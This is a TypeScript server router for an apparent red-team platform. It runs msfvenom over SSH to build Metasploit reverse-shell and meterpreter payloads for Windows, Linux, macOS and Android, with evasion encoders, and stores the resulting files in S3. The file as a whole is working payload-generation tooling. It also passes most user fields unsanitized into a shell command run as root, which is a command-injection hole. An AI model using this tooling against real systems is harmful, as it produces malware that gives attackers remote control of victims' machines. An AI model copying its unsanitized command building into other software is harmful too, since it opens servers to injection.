/**
 * Payload Generator Router — wraps msfvenom execution through SSH tunnel.
 * Generates custom payloads on the MSF server, downloads them, and stores in S3.
 */
import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import { TRPCError } from "@trpc/server";
import { eq, desc } from "drizzle-orm";
import { Client as SSHClient } from "ssh2";
import { createHash } from "crypto";
import * as fs from "fs";

// ─── Constants ──────────────────────────────────────────────────────────────

const PAYLOAD_TYPES = [
  // Windows
  "windows/meterpreter/reverse_tcp",
  "windows/meterpreter/reverse_https",
  "windows/meterpreter_reverse_tcp",
  "windows/x64/meterpreter/reverse_tcp",
  "windows/x64/meterpreter/reverse_https",
  "windows/x64/shell_reverse_tcp",
  "windows/shell_reverse_tcp",
  "windows/shell/reverse_tcp",
  // Linux
  "linux/x86/meterpreter/reverse_tcp",
  "linux/x64/meterpreter/reverse_tcp",
  "linux/x64/shell_reverse_tcp",
  "linux/x86/shell/reverse_tcp",
  // macOS
  "osx/x64/meterpreter/reverse_tcp",
  "osx/x64/shell_reverse_tcp",
  // Android
  "android/meterpreter/reverse_tcp",
  "android/meterpreter/reverse_https",
  // Multi
  "python/meterpreter/reverse_tcp",
  "python/meterpreter/reverse_https",
  "php/meterpreter/reverse_tcp",
  "java/meterpreter/reverse_tcp",
  "cmd/unix/reverse_bash",
  "cmd/unix/reverse_python",
  "generic/shell_reverse_tcp",
] as const;

const FORMATS = [
  "exe", "elf", "apk", "ps1", "py", "raw", "dll", "macho",
  "msi", "vba", "war", "asp", "aspx", "jsp", "php", "bash",
  "sh", "pl", "rb", "c", "csharp", "powershell", "psh-reflection",
] as const;

const ENCODERS = [
  "x86/shikata_ga_nai",
  "x64/xor",
  "x64/xor_dynamic",
  "x86/countdown",
  "x86/fnstenv_mov",
  "x86/jmp_call_additive",
  "cmd/powershell_base64",
  "php/base64",
  "ruby/base64",
  "generic/none",
] as const;

const ARCHITECTURES = ["x86", "x64", "armle", "aarch64"] as const;
const PLATFORMS = ["windows", "linux", "osx", "android", "java", "php", "python", "ruby"] as const;

// ─── SSH Command Execution Helper ───────────────────────────────────────────

async function execSSHCommand(
  server: {
    ipAddress: string | null;
    sshUser?: string | null;
    sshKeyPath?: string | null;
  },
  command: string,
  timeoutMs = 120_000
): Promise<{ stdout: string; stderr: string; code: number }> {
  const host = server.ipAddress;
  if (!host) throw new Error("Server has no IP address");

  const keyPath = server.sshKeyPath || `${process.env.HOME}/.ssh/msf_deploy_key`;
  if (!fs.existsSync(keyPath)) {
    throw new Error(`SSH key not found at ${keyPath}`);
  }

  return new Promise((resolve, reject) => {
    const conn = new SSHClient();
    let stdout = "";
    let stderr = "";
    let timedOut = false;

    const timer = setTimeout(() => {
      timedOut = true;
      conn.end();
      reject(new Error(`SSH command timed out after ${timeoutMs / 1000}s`));
    }, timeoutMs);

    conn
      .on("ready", () => {
        conn.exec(command, (err, stream) => {
          if (err) {
            clearTimeout(timer);
            conn.end();
            return reject(err);
          }

          stream
            .on("close", (code: number) => {
              clearTimeout(timer);
              conn.end();
              if (!timedOut) {
                resolve({ stdout, stderr, code: code || 0 });
              }
            })
            .on("data", (data: Buffer) => {
              stdout += data.toString();
            })
            .stderr.on("data", (data: Buffer) => {
              stderr += data.toString();
            });
        });
      })
      .on("error", (err) => {
        clearTimeout(timer);
        reject(err);
      })
      .connect({
        host,
        port: 22,
        username: server.sshUser || "root",
        privateKey: fs.readFileSync(keyPath),
        readyTimeout: 10_000,
      });
  });
}

/** Download a file from the remote server via SSH/SCP */
async function downloadFileSSH(
  server: {
    ipAddress: string | null;
    sshUser?: string | null;
    sshKeyPath?: string | null;
  },
  remotePath: string,
  timeoutMs = 60_000
): Promise<Buffer> {
  const host = server.ipAddress;
  if (!host) throw new Error("Server has no IP address");

  const keyPath = server.sshKeyPath || `${process.env.HOME}/.ssh/msf_deploy_key`;

  return new Promise((resolve, reject) => {
    const conn = new SSHClient();
    const timer = setTimeout(() => {
      conn.end();
      reject(new Error("File download timed out"));
    }, timeoutMs);

    conn
      .on("ready", () => {
        conn.sftp((err, sftp) => {
          if (err) {
            clearTimeout(timer);
            conn.end();
            return reject(err);
          }

          const chunks: Buffer[] = [];
          const readStream = sftp.createReadStream(remotePath);

          readStream
            .on("data", (chunk: Buffer) => chunks.push(chunk))
            .on("end", () => {
              clearTimeout(timer);
              conn.end();
              resolve(Buffer.concat(chunks));
            })
            .on("error", (readErr: Error) => {
              clearTimeout(timer);
              conn.end();
              reject(readErr);
            });
        });
      })
      .on("error", (err) => {
        clearTimeout(timer);
        reject(err);
      })
      .connect({
        host,
        port: 22,
        username: server.sshUser || "root",
        privateKey: fs.readFileSync(keyPath),
        readyTimeout: 10_000,
      });
  });
}

// ─── Router ─────────────────────────────────────────────────────────────────

export const payloadGeneratorRouter = router({
  // ─── Get available options ────────────────────────────────────────────────
  getOptions: protectedProcedure.query(() => {
    return {
      payloadTypes: [...PAYLOAD_TYPES],
      formats: [...FORMATS],
      encoders: [...ENCODERS],
      architectures: [...ARCHITECTURES],
      platforms: [...PLATFORMS],
    };
  }),

  // ─── Generate a payload ───────────────────────────────────────────────────
  generate: protectedProcedure
    .input(
      z.object({
        serverId: z.number(),
        name: z.string().min(1).max(255),
        payload: z.string().min(1),
        format: z.string().min(1),
        lhost: z.string().min(1),
        lport: z.number().min(1).max(65535),
        encoder: z.string().optional(),
        iterations: z.number().min(1).max(20).optional(),
        arch: z.string().optional(),
        platform: z.string().optional(),
        extraOptions: z.record(z.string(), z.string()).optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const { generatedPayloads, metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const db = await getDbRequired();

      // Get the server
      const [server] = await db
        .select()
        .from(metasploitServers)
        .where(eq(metasploitServers.id, input.serverId))
        .limit(1);

      if (!server) {
        throw new TRPCError({ code: "NOT_FOUND", message: "MSF server not found" });
      }

      // Build the msfvenom command
      const parts = [
        "/opt/metasploit-framework/bin/msfvenom",
        `-p ${input.payload}`,
        `LHOST=${input.lhost}`,
        `LPORT=${input.lport}`,
      ];

      if (input.format) parts.push(`-f ${input.format}`);
      if (input.encoder) parts.push(`-e ${input.encoder}`);
      if (input.iterations && input.iterations > 1) parts.push(`-i ${input.iterations}`);
      if (input.arch) parts.push(`-a ${input.arch}`);
      if (input.platform) parts.push(`--platform ${input.platform}`);

      // Add extra options
      if (input.extraOptions) {
        for (const [key, val] of Object.entries(input.extraOptions)) {
          // Sanitize key/value to prevent command injection
          const safeKey = key.replace(/[^a-zA-Z0-9_]/g, "");
          const safeValue = String(val).replace(/[;&|`$()]/g, "");
          parts.push(`${safeKey}=${safeValue}`);
        }
      }

      // Output to a temp file on the server
      const timestamp = Date.now();
      const safeFormat = input.format.replace(/[^a-zA-Z0-9]/g, "");
      const remotePath = `/tmp/payload_${timestamp}.${safeFormat}`;
      parts.push(`-o ${remotePath}`);

      const msfvenomCommand = parts.join(" ");

      // Insert the record as pending
      const [insertResult] = await db.insert(generatedPayloads).values({
        serverId: input.serverId,
        name: input.name,
        payload: input.payload,
        format: input.format,
        lhost: input.lhost,
        lport: input.lport,
        encoder: input.encoder || null,
        iterations: input.iterations || 1,
        arch: input.arch || null,
        platform: input.platform || null,
        extraOptions: input.extraOptions ? JSON.stringify(input.extraOptions) : null,
        msfvenomCommand,
        status: "generating",
        createdBy: ctx.user.id,
      });

      const payloadId = insertResult.insertId;

      // Execute msfvenom in the background
      (async () => {
        try {
          console.log(`[PayloadGen] Generating payload #${payloadId}: ${msfvenomCommand}`);

          const result = await execSSHCommand(
            {
              ipAddress: server.ipAddress,
              sshUser: server.sshUser,
              sshKeyPath: server.sshKeyPath,
            },
            msfvenomCommand,
            120_000
          );

          if (result.code !== 0) {
            const errMsg = result.stderr || result.stdout || "Unknown error";
            console.error(`[PayloadGen] msfvenom failed for #${payloadId}:`, errMsg);
            await db
              .update(generatedPayloads)
              .set({
                status: "failed",
                errorMessage: errMsg.substring(0, 5000),
                completedAt: new Date(),
              })
              .where(eq(generatedPayloads.id, Number(payloadId)));
            return;
          }

          // Download the generated file
          const fileBuffer = await downloadFileSSH(
            {
              ipAddress: server.ipAddress,
              sshUser: server.sshUser,
              sshKeyPath: server.sshKeyPath,
            },
            remotePath
          );

          // Calculate SHA256
          const sha256 = createHash("sha256").update(fileBuffer).digest("hex");

          // Upload to S3
          const { storagePut } = await import("../storage");
          const fileKey = `payloads/${payloadId}-${input.name.replace(/[^a-zA-Z0-9.-]/g, "_")}.${safeFormat}`;
          const { url: fileUrl } = await storagePut(fileKey, fileBuffer, "application/octet-stream");

          // Update record
          await db
            .update(generatedPayloads)
            .set({
              status: "completed",
              fileKey,
              fileUrl,
              fileSize: fileBuffer.length,
              fileSha256: sha256,
              completedAt: new Date(),
            })
            .where(eq(generatedPayloads.id, Number(payloadId)));

          // Clean up remote file
          await execSSHCommand(
            {
              ipAddress: server.ipAddress,
              sshUser: server.sshUser,
              sshKeyPath: server.sshKeyPath,
            },
            `rm -f ${remotePath}`,
            10_000
          ).catch(() => {});

          console.log(`[PayloadGen] Payload #${payloadId} completed: ${fileUrl} (${fileBuffer.length} bytes, SHA256: ${sha256})`);
        } catch (err: any) {
          console.error(`[PayloadGen] Error generating payload #${payloadId}:`, err);
          await db
            .update(generatedPayloads)
            .set({
              status: "failed",
              errorMessage: err.message?.substring(0, 5000) || "Unknown error",
              completedAt: new Date(),
            })
            .where(eq(generatedPayloads.id, Number(payloadId)))
            .catch(() => {});
        }
      })();

      return {
        payloadId: Number(payloadId),
        status: "generating",
        command: msfvenomCommand,
      };
    }),

  // ─── Get payload status ───────────────────────────────────────────────────
  getStatus: protectedProcedure
    .input(z.object({ payloadId: z.number() }))
    .query(async ({ input }) => {
      const { generatedPayloads } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const db = await getDbRequired();

      const [payload] = await db
        .select()
        .from(generatedPayloads)
        .where(eq(generatedPayloads.id, input.payloadId))
        .limit(1);

      if (!payload) {
        throw new TRPCError({ code: "NOT_FOUND", message: "Payload not found" });
      }

      return payload;
    }),

  // ─── List all generated payloads ──────────────────────────────────────────
  list: protectedProcedure
    .input(
      z.object({
        serverId: z.number().optional(),
        limit: z.number().min(1).max(100).default(50),
      }).optional()
    )
    .query(async ({ input }) => {
      const { generatedPayloads } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const db = await getDbRequired();

      if (input?.serverId) {
        return await db
          .select()
          .from(generatedPayloads)
          .where(eq(generatedPayloads.serverId, input.serverId))
          .orderBy(desc(generatedPayloads.createdAt))
          .limit(input.limit);
      }

      return await db
        .select()
        .from(generatedPayloads)
        .orderBy(desc(generatedPayloads.createdAt))
        .limit(input?.limit ?? 50);
    }),

  // ─── Delete a payload ─────────────────────────────────────────────────────
  delete: protectedProcedure
    .input(z.object({ payloadId: z.number() }))
    .mutation(async ({ input }) => {
      const { generatedPayloads } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const db = await getDbRequired();

      const { sql } = await import("drizzle-orm");
      await db
        .delete(generatedPayloads)
        .where(eq(generatedPayloads.id, input.payloadId));

      return { success: true };
    }),

  // ─── Preview msfvenom command ─────────────────────────────────────────────
  previewCommand: protectedProcedure
    .input(
      z.object({
        payload: z.string().min(1),
        format: z.string().min(1),
        lhost: z.string().min(1),
        lport: z.number().min(1).max(65535),
        encoder: z.string().optional(),
        iterations: z.number().min(1).max(20).optional(),
        arch: z.string().optional(),
        platform: z.string().optional(),
        extraOptions: z.record(z.string(), z.string()).optional(),
      })
    )
    .query(({ input }) => {
      const parts = [
        "msfvenom",
        `-p ${input.payload}`,
        `LHOST=${input.lhost}`,
        `LPORT=${input.lport}`,
      ];

      if (input.format) parts.push(`-f ${input.format}`);
      if (input.encoder) parts.push(`-e ${input.encoder}`);
      if (input.iterations && input.iterations > 1) parts.push(`-i ${input.iterations}`);
      if (input.arch) parts.push(`-a ${input.arch}`);
      if (input.platform) parts.push(`--platform ${input.platform}`);

      if (input.extraOptions) {
        for (const [key, val] of Object.entries(input.extraOptions)) {
          const safeKey = key.replace(/[^a-zA-Z0-9_]/g, "");
          const safeValue = String(val).replace(/[;&|`$()]/g, "");
          parts.push(`${safeKey}=${safeValue}`);
        }
      }

      parts.push("-o <output_file>");

      return { command: parts.join(" ") };
    }),

  // ─── List available payloads from MSF server ──────────────────────────────
  listMsfPayloads: protectedProcedure
    .input(z.object({ serverId: z.number(), filter: z.string().optional() }))
    .query(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const db = await getDbRequired();

      const [server] = await db
        .select()
        .from(metasploitServers)
        .where(eq(metasploitServers.id, input.serverId))
        .limit(1);

      if (!server) {
        throw new TRPCError({ code: "NOT_FOUND", message: "MSF server not found" });
      }

      try {
        const cmd = input.filter
          ? `/opt/metasploit-framework/bin/msfvenom --list payloads 2>/dev/null | grep -i "${input.filter.replace(/[^a-zA-Z0-9_/]/g, "")}"`
          : `/opt/metasploit-framework/bin/msfvenom --list payloads 2>/dev/null | head -200`;

        const result = await execSSHCommand(
          {
            ipAddress: server.ipAddress,
            sshUser: server.sshUser,
            sshKeyPath: server.sshKeyPath,
          },
          cmd,
          30_000
        );

        const lines = result.stdout
          .split("\n")
          .filter((l) => l.trim() && !l.startsWith("=") && !l.startsWith("Framework") && !l.startsWith("Name"))
          .map((l) => {
            const parts = l.trim().split(/\s{2,}/);
            return { name: parts[0] || "", description: parts.slice(1).join(" ") || "" };
          })
          .filter((p) => p.name.includes("/"));

        return lines;
      } catch (err: any) {
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: `Failed to list payloads: ${err.message}`,
        });
      }
    }),

  // ─── List available encoders from MSF server ─────────────────────────────
  listMsfEncoders: protectedProcedure
    .input(z.object({ serverId: z.number() }))
    .query(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const db = await getDbRequired();

      const [server] = await db
        .select()
        .from(metasploitServers)
        .where(eq(metasploitServers.id, input.serverId))
        .limit(1);

      if (!server) {
        throw new TRPCError({ code: "NOT_FOUND", message: "MSF server not found" });
      }

      try {
        const result = await execSSHCommand(
          {
            ipAddress: server.ipAddress,
            sshUser: server.sshUser,
            sshKeyPath: server.sshKeyPath,
          },
          `/opt/metasploit-framework/bin/msfvenom --list encoders 2>/dev/null`,
          30_000
        );

        const lines = result.stdout
          .split("\n")
          .filter((l) => l.trim() && !l.startsWith("=") && !l.startsWith("Framework") && !l.startsWith("Name"))
          .map((l) => {
            const parts = l.trim().split(/\s{2,}/);
            return {
              name: parts[0] || "",
              rank: parts[1] || "",
              description: parts.slice(2).join(" ") || "",
            };
          })
          .filter((e) => e.name.includes("/"));

        return lines;
      } catch (err: any) {
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: `Failed to list encoders: ${err.message}`,
        });
      }
    }),
});
